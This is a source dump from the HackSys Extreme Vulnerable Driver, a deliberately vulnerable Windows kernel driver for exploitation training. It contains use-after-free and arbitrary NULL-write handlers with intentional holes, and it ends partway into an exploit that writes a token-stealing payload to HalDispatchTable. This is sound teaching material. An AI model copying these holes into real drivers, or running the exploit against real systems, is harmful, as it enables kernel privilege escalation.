TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFreeNonPagedPool.h

Abstract:
    This module implements the data structures for
    use after free in NonPagedPool module.

--*/

#pragma once

#ifndef __USE_AFTER_FREE_NON_PAGED_POOL_H__
#define __USE_AFTER_FREE_NON_PAGED_POOL_H__

#include "Common.h"


//
// Structures
//

typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;

typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
    CHAR Buffer[0x54 + sizeof(PVOID)];
} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;


//
// Function Definitions
//

VOID
UaFObjectCallbackNonPagedPool(
    VOID
);

NTSTATUS
UseUaFObjectNonPagedPool(
    VOID
);

NTSTATUS
FreeUaFObjectNonPagedPool(
    VOID
);

NTSTATUS
AllocateUaFObjectNonPagedPool(
    VOID
);

NTSTATUS
AllocateFakeObjectNonPagedPool(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
);

#endif  // !__USE_AFTER_FREE_NON_PAGED_POOL_H__

```

`Driver/HEVD/Windows/UseAfterFreeNonPagedPoolNx.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFreeNonPagedPoolNx.c

Abstract:
    This module implements the functions to demonstrate
    Use After Free in NonPagedPoolNx vulnerability.

--*/

#include "UseAfterFreeNonPagedPoolNx.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, UseUaFObjectNonPagedPoolNx)
#pragma alloc_text(PAGE, FreeUaFObjectNonPagedPoolNx)
#pragma alloc_text(PAGE, AllocateUaFObjectNonPagedPoolNx)
#pragma alloc_text(PAGE, UaFObjectCallbackNonPagedPoolNx)
#pragma alloc_text(PAGE, AllocateFakeObjectNonPagedPoolNx)
#pragma alloc_text(PAGE, UseUaFObjectNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, FreeUaFObjectNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, AllocateUaFObjectNonPagedPoolNxIoctlHandler)
#pragma alloc_text(PAGE, AllocateFakeObjectNonPagedPoolNxIoctlHandler)
#endif // ALLOC_PRAGMA


PUSE_AFTER_FREE_NON_PAGED_POOL_NX g_UseAfterFreeObjectNonPagedPoolNx = NULL;


/// <summary>
/// Use After Free Object Callback NonPagedPoolNx
/// </summary>
VOID
UaFObjectCallbackNonPagedPoolNx(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] UseAfter Free Object Callback NonPagedPoolNx\n");
}


/// <summary>
/// Allocate the UaF object in NonPagedPoolNx
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateUaFObjectNonPagedPoolNx(
    VOID
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PUSE_AFTER_FREE_NON_PAGED_POOL_NX UseAfterFree = NULL;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating UaF Object\n");

        //
        // Allocate Pool chunk
        //

        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL_NX)ExAllocatePoolWithTag(
            NonPagedPoolNx,
            sizeof(USE_AFTER_FREE_NON_PAGED_POOL_NX),
            (ULONG)POOL_TAG
        );

        if (!UseAfterFree)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL_NX));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
        }

        //
        // Fill the buffer with ASCII 'A'
        //

        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);

        //
        // Null terminate the char buffer
        //

        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';

        //
        // Set the object Callback function
        //

        UseAfterFree->Callback = &UaFObjectCallbackNonPagedPoolNx;

        //
        // Assign the address of UseAfterFree to a global variable
        //

        g_UseAfterFreeObjectNonPagedPoolNx = UseAfterFree;

        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPoolNx: 0x%p\n", g_UseAfterFreeObjectNonPagedPoolNx);
        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Use the UaF object NonPagedPoolNx
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
UseUaFObjectNonPagedPoolNx(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPoolNx)
        {
            DbgPrint("[+] Using UaF Object\n");
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPoolNx: 0x%p\n", g_UseAfterFreeObjectNonPagedPoolNx);
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPoolNx->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPoolNx->Callback);
            DbgPrint("[+] Calling Callback\n");

            if (g_UseAfterFreeObjectNonPagedPoolNx->Callback)
            {
                g_UseAfterFreeObjectNonPagedPoolNx->Callback();
            }

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Free the UaF object NonPagedPoolNx
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
FreeUaFObjectNonPagedPoolNx(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPoolNx)
        {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPoolNx);

#ifdef SECURE
            //
            // Secure Note: This is secure because the developer is setting
            // 'g_UseAfterFreeObjectNonPagedPoolNx' to NULL once the Pool chunk is being freed
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPoolNx, (ULONG)POOL_TAG);

            //
            // Set to NULL to avoid dangling pointer
            //

            g_UseAfterFreeObjectNonPagedPoolNx = NULL;
#else
            //
            // Vulnerability Note: This is a vanilla Use After Free vulnerability
            // because the developer is not setting 'g_UseAfterFreeObjectNonPagedPoolNx' to NULL.
            // Hence, g_UseAfterFreeObjectNonPagedPoolNx still holds the reference to stale pointer
            // (dangling pointer)
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPoolNx, (ULONG)POOL_TAG);
#endif

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Allocate the Fake object NonPagedPoolNx
/// </summary>
/// <param name="UserFakeObject">The pointer to FAKE_OBJECT_NON_PAGED_POOL structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateFakeObjectNonPagedPoolNx(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL_NX UserFakeObject
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PFAKE_OBJECT_NON_PAGED_POOL_NX KernelFakeObject = NULL;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Creating Fake Object\n");

        //
        // Allocate Pool chunk
        //

        KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL_NX)ExAllocatePoolWithTag(
            NonPagedPoolNx,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL_NX),
            (ULONG)POOL_TAG
        );

        if (!KernelFakeObject)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL_NX));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
        }

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL_NX),
            (ULONG)__alignof(UCHAR)
        );

        //
        // Copy the Fake structure to Pool chunk
        //

        RtlCopyMemory(
            (PVOID)KernelFakeObject,
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL_NX)
        );

        //
        // Null terminate the char buffer
        //

        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';

        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Allocate UaF Object NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP.</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = AllocateUaFObjectNonPagedPoolNx();

    return Status;
}


/// <summary>
/// Use UaF Object NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
UseUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = UseUaFObjectNonPagedPoolNx();

    return Status;
}


/// <summary>
/// Free UaF Object NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
FreeUaFObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = FreeUaFObjectNonPagedPoolNx();

    return Status;
}


/// <summary>
/// Allocate Fake Object NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateFakeObjectNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PFAKE_OBJECT_NON_PAGED_POOL_NX UserFakeObject = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL_NX)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserFakeObject)
    {
        Status = AllocateFakeObjectNonPagedPoolNx(UserFakeObject);
    }

    return Status;
}

```

`Driver/HEVD/Windows/UseAfterFreeNonPagedPoolNx.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFreeNonPagedPoolNx.h

Abstract:
    This module implements the data structures for
    use after free in NonPagedPoolNx module.

--*/

#pragma once

#ifndef __USE_AFTER_FREE_NON_PAGED_POOL_NX_H__
#define __USE_AFTER_FREE_NON_PAGED_POOL_NX_H__

#include "Common.h"


//
// Structures
//

typedef struct _USE_AFTER_FREE_NON_PAGED_POOL_NX
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
} USE_AFTER_FREE_NON_PAGED_POOL_NX, *PUSE_AFTER_FREE_NON_PAGED_POOL_NX;

typedef struct _FAKE_OBJECT_NON_PAGED_POOL_NX
{
    CHAR Buffer[0x54 + sizeof(PVOID)];
} FAKE_OBJECT_NON_PAGED_POOL_NX, *PFAKE_OBJECT_NON_PAGED_POOL_NX;


//
// Function Definitions
//

VOID
UaFObjectCallbackNonPagedPoolNx(
    VOID
);

NTSTATUS
UseUaFObjectNonPagedPoolNx(
    VOID
);

NTSTATUS
FreeUaFObjectNonPagedPoolNx(
    VOID
);

NTSTATUS
AllocateUaFObjectNonPagedPoolNx(
    VOID
);

NTSTATUS
AllocateFakeObjectNonPagedPoolNx(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL_NX UserFakeObject
);

#endif  // !__USE_AFTER_FREE_NON_PAGED_POOL_NX_H__

```

`Driver/HEVD/Windows/WriteNULL.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    WriteNULL.c

Abstract:
    This module implements the functions to demonstrate
    Write NULL vulnerability.

--*/

#include "WriteNULL.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerWriteNULL)
#pragma alloc_text(PAGE, WriteNULLIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Write NULL Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerWriteNULL(
    _In_ PVOID UserBuffer
)
{
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(PVOID), (ULONG)__alignof(PVOID));

        //
        // Grab the user pointer to nullify to avoid race condition
        //

        PVOID UserPointerToNullify = *(PVOID *)UserBuffer;

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserPointerToNullify: 0x%p\n", UserPointerToNullify);

#ifdef SECURE

        //
        // Secure Note: This is secure because the developer is properly validating if 
        // '*(UserBuffer)' resides in User mode by calling ProbeForWrite() routine before
        // performing the write operation
        //

        ProbeForWrite(UserPointerToNullify, sizeof(PVOID), (ULONG)__alignof(PVOID));

        *(PVOID *)UserPointerToNullify = NULL;
#else
        DbgPrint("[+] Triggering Arbitrary NULL Write\n");

        //
        // Vulnerability Note: This is a vanilla Arbitrary NULL Write vulnerability
        // because the developer is writing NULL to the memory pointed by '*(UserBuffer)'
        // without properly validating if it resides in User mode
        //

        *(PVOID *)UserPointerToNullify = NULL;
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Write NULL Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
WriteNULLIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserBuffer)
    {
        Status = TriggerWriteNULL(UserBuffer);
    }

    return Status;
}

```

`Driver/HEVD/Windows/WriteNULL.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    WriteNULL.h

Abstract:
    This module implements the data structures for
    write NULL module.

--*/

#pragma once

#ifndef __WRITE_NULL_H__
#define __WRITE_NULL_H__

#include "Common.h"


//
// Function Definitions
//

NTSTATUS
TriggerWriteNULL(
    _In_ PVOID UserBuffer
);

#endif // !__WRITE_NULL_H__

```

`Exploit/ArbitraryOverwrite.c`:

```c
/*++

          ##     ## ######## ##     ## ########  
          ##     ## ##       ##     ## ##     ## 
          ##     ## ##       ##     ## ##     ## 
          ######### ######   ##     ## ##     ## 
          ##     ## ##        ##   ##  ##     ## 
          ##     ## ##         ## ##   ##     ## 
          ##     ## ########    ###    ########  

        HackSys Extreme Vulnerable Driver Exploit

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryOverwrite.c

Abstract:
    This module implements the exploit for Arbitrary Memory
    Overwrite Vulnerability implemented in HackSys Extreme
    Vulnerable Driver.

--*/

#include "ArbitraryOverwrite.h"

DWORD WINAPI ArbitraryOverwriteThread(LPVOID Parameter) {
    ULONG Interval = 0;
    ULONG BytesReturned;
    HANDLE hFile = NULL;
    HMODULE hNtDll = NULL;
    PVOID HalDispatchTable = NULL;
    PVOID HalDispatchTablePlus4 = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
    PVOID EopPayload = &TokenStealingPayloadWin7Generic;

    __try {
        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);

        hFile = GetDeviceHandle(FileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For WRITE_WHAT_WHERE Structure\n");

        // Allocate the Heap chunk
        WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
                                                      HEAP_ZERO_MEMORY,
                                                      sizeof(WRITE_WHAT_WHERE));

        if (!WriteWhatWhere) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", WriteWhatWhere);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(WRITE_WHAT_WHERE));
        }

        DEBUG_INFO("\t\t[+] Gathering Information About Kernel\n");

        HalDispatchTable = GetHalDispatchTable();

        if (!HalDispatchTable) {
            DEBUG_ERROR("\t\t[-] Failed Gathering Information: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            HalDispatchTablePlus4 = (PVOID)((ULONG_PTR)HalDispatchTable + sizeof(PVOID));

            DEBUG_INFO("\t\t\t[+] HalDispatchTable+0x4: 0x%p\n", HalDispatchTablePlus4);
        }

        DEBUG_INFO("\t\t[+] Preparing WRITE_WHAT_WHERE structure\n");

        WriteWhatWhere->What = (PULONG_PTR)&EopPayload;
        WriteWhatWhere->Where = (PULONG_PTR)HalDispatchTablePlus4;

        DEBUG_INFO("\t\t\t[+] WriteWhatWhere: 0x%p\n", WriteWhatWhere);
